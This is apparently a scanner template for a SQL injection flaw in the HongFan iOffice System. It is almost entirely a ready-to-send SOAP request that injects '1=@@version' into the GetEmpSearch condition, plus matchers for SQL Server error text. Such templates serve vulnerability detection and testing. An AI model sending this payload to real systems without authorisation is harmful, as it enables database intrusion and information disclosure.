folder-6/poc-yaml-hongfan-ioffice-system-sql-injection.yaml

id: poc-yaml-hongfan-ioffice-system-sql-injection
info:
  name: HongFan iOffice System SQL Injection Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    A vulnerability in the HongFan iOffice System allows SQL injection via crafted SOAP requests. Exploitation can lead to sensitive database information disclosure.

http:
  - raw:
      - |
        POST /iOffice/prg/set/wss/udfmr.asmx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=utf-8

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
            <GetEmpSearch xmlns="http://tempuri.org/ioffice/udfmr">
              <condition>1=@@version</condition>
            </GetEmpSearch>
          </soap:Body>
        </soap:Envelope>
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "System.Data.SqlClient.SqlException"
        part: body
      - type: word
        words:
          - "Microsoft SQL Server"
        part: body
